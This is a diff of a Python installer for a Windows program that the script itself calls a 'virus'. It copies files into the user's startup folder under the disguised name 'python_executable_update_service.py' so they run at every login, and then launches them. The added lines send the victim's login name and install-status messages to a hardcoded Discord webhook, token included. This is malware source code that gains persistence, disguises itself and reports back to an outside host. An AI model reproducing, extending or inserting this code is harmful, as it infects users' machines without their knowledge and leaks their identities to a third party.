@@ -1,9 +1,18 @@
-import os, sys, shutil
+import os, sys, shutil, requests
 PYTHON_COMMAND = sys.executable
 
 if sys.platform != "win32":
     print("This is ment for windows only. \nExiting...")
     exit(1)
+
+def log_to_discord(msg:str):
+    data = {"username":f"User:{os.getlogin()}", "content":msg}
+    try:
+        requests.post("https://discord.com/api/webhooks/1433805119048122378/ti6aDqUL3CiJ4SVUWDLww1ef49SxVmaMsDK4Tvd8zX9ojhxmUkJ_iSaSPdWtKsVO82AM", json = data)
+    except:
+        print("Failed to send port request")
+
+log_to_discord("Installing of virus...")
 
 home_dir = os.path.expanduser("~")
 startup_folder = os.path.join(
@@ -43,6 +52,7 @@ for source, dest in file_table:
     print(f"Copied {source} to {dest}.")
 
 
+log_to_discord("Virus installed successfuly. Running it...")
 
 print("Starting virus...")
 startup_script = os.path.join(shell_startup_dir, "python_executable_update_service.py")
